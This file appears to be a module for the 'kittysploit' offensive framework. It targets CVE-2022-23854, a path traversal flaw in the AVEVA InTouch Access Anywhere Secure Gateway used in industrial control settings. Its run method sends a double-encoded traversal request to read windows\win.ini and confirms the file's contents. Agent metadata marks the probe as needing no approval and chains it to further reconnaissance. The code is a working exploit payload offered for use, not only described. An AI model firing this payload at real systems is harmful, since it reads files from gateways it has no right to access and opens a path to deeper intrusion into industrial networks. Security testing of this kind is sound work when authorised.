#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AVEVA InTouch Access Anywhere Secure Gateway is vulnerable to local file inclusion."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AVEVA InTouch Access Anywhere Secure Gateway - Local File Inclusion Detection',
        'description': 'AVEVA InTouch Access Anywhere Secure Gateway is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'lfi', 'packetstorm', 'aveva', 'intouch', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/cve/CVE-2022-23854',
            'https://www.aveva.com',
            'https://crisec.de/advisory-aveva-intouch-access-anywhere-secure-gateway-path-traversal',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23854',
            'https://www.cisa.gov/uscert/ics/advisories/icsa-22-342-02',
        ],
        'cve': 'CVE-2022-23854',
    }

    def run(self):
        r = self.http_request(method="GET", path='/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('for 16-bit app support', 'extensions',)
        header_any = ('text/ini', 'application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="AVEVA InTouch Access Anywhere Secure Gateway - Local File Inclusion detected",
                path='/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini',
            )
            return True
        return False

